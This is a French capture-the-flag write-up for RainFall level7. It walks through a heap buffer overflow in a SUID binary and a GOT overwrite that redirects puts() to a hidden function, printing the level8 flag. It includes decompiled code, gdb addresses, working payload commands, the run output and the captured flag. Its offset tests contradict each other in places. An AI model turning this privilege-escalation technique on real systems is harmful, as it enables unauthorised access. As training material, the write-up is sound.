# RainFall CTF - Level7

## Reconnaissance

### Fichier trouvé
```bash
level7@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level8` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level8`

## Analyse statique avec Ghidra

### Fonction main (vulnérable)
```c
undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

### Fonction cachée m
```c
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}
```

## Analyse des relocations dynamiques

```bash
level7@RainFall:~$ objdump -R ./level7 

./level7:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049904 R_386_GLOB_DAT    __gmon_start__
08049914 R_386_JUMP_SLOT   printf
08049918 R_386_JUMP_SLOT   fgets
0804991c R_386_JUMP_SLOT   time
08049920 R_386_JUMP_SLOT   strcpy
08049924 R_386_JUMP_SLOT   malloc
08049928 R_386_JUMP_SLOT   puts
0804992c R_386_JUMP_SLOT   __gmon_start__
08049930 R_386_JUMP_SLOT   __libc_start_main
08049934 R_386_JUMP_SLOT   fopen
```

**Informations importantes :**
- **GOT de puts** : `0x08049928`
- **GOT de printf** : `0x08049914`

## Analyse des vulnérabilités

### Heap Buffer Overflow
- **Fonctions dangereuses** : `strcpy((char *)puVar1[1], argv[1])` et `strcpy((char *)puVar3[1], argv[2])`
- **Problème** : Aucune vérification de la taille des arguments
- **Buffer alloués** : 8 octets chacun (`malloc(8)`)
- **Impact** : Débordement possible sur la heap

### Architecture de la heap
```
Structure 1: [ID=1] [Pointeur vers buffer1]
Buffer 1:    [8 octets alloués]
Structure 2: [ID=2] [Pointeur vers buffer2] 
Buffer 2:    [8 octets alloués]
```

### Objectif d'exploitation
La variable globale `c` contient le flag grâce à cette ligne :
```c
fgets(c,0x44,__stream);
```

La fonction `m()` permet d'afficher le contenu de `c` via `printf("%s - %d\n", c, tVar1)`.

## Découverte des adresses

### Adresse de la fonction m
```bash
gdb ./level7
(gdb) info functions
0x080484f4  m
```

### Adresse de la variable globale c
```bash
(gdb) info variables
0x08049960  c
```

## Stratégie d'exploitation : GOT Overwrite

### Principe
1. **Premier strcpy** : Déborder le buffer1 pour écraser le pointeur de la structure 2
2. **Redirection** : Faire pointer la structure 2 vers l'entrée GOT de `puts`
3. **Deuxième strcpy** : Écrire l'adresse de la fonction `m()` dans l'entrée GOT de `puts`
4. **Résultat** : `puts("~~")` exécutera `m()` qui affichera le flag

### Tests de débordement

```bash
# Test avec 16 'A' - fonctionne
./level7 $(python -c "print 'A'*16 + '\x28\x99\x04\x08'") $(python -c "print '\x60\x99\x04\x08'")
~~

# Test avec 18 'A' - segfault
./level7 $(python -c "print 'A'*18 + '\x28\x99\x04\x08'") $(python -c "print '\x60\x99\x04\x08'")
Segmentation fault (core dumped)

# Test avec 20 'A' - segfault
./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\x60\x99\x04\x08'")
Segmentation fault (core dumped)
```

### Offset correct : 20 caractères

Après tests, l'offset correct pour atteindre le pointeur de la deuxième structure est de **20 octets**.

## Construction de l'exploit

### Payload final
```bash
./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
```

**Structure du payload :**
- **Premier argument** :
  - `'A'*20` : Padding pour atteindre le pointeur de la structure 2
  - `\x28\x99\x04\x08` : Adresse GOT de `puts` (0x08049928) en little-endian
- **Deuxième argument** :
  - `\xf4\x84\x04\x08` : Adresse de la fonction `m()` (0x080484f4) en little-endian

## Mécanisme d'exécution

1. **malloc(8)** alloue les structures et buffers sur la heap
2. **Premier strcpy** : Les 20 'A' débordent et écrasent le pointeur de la structure 2 avec l'adresse GOT de `puts`
3. **Deuxième strcpy** : Écrit l'adresse de `m()` dans l'entrée GOT de `puts` (à l'adresse 0x08049928)
4. **fgets(c, 0x44, __stream)** : Lit le flag dans la variable globale `c`
5. **puts("~~")** : Appelle en réalité `m()` à cause de la redirection GOT
6. **m()** : Exécute `printf("%s - %d\n", c, tVar1)` et affiche le flag

## Exploitation réussie

```bash
level7@RainFall:~$ ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1757405997
```

## Résultats

### Flag obtenu
```
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

### Accès niveau suivant
- **Utilisateur** : `level8`
- **Prochain challenge** : `/home/user/level8/`

## Notes techniques

- **Type de vulnérabilité** : Heap Buffer Overflow + GOT Overwrite
- **Technique d'exploitation** : Global Offset Table Hijacking
- **Architecture** : x86 (32-bit)
- **Concepts introduits** :
  - **GOT Overwrite** : Redirection d'appels de fonctions via la GOT
  - **Heap exploitation avancée** : Manipulation de structures liées sur la heap
  - **Variable globale** : Exploitation d'une variable globale contenant des données sensibles
  - **Fonction cachée** : Découverte et utilisation d'une fonction non appelée dans le flow normal
- **Méthode de découverte** : Analyse statique avec Ghidra + tests empiriques d'offset
- **Offset calculé** : 20 octets pour atteindre le pointeur de la deuxième structure
- **Difficulté** : Avancée - Introduction aux techniques GOT hijacking

## Évolution par rapport aux niveaux précédents

Ce niveau introduit des concepts d'exploitation avancés :
- **GOT Overwrite** : Première utilisation de cette technique dans le CTF
- **Structures heap liées** : Exploitation de structures de données complexes
- **Redirection indirecte** : Utilisation d'une fonction cachée pour révéler des données
- **Analysis forensique** : Découverte de fonctions non documentées dans le binaire

Cette progression prépare aux techniques d'exploitation les plus sophistiquées des niveaux suivants.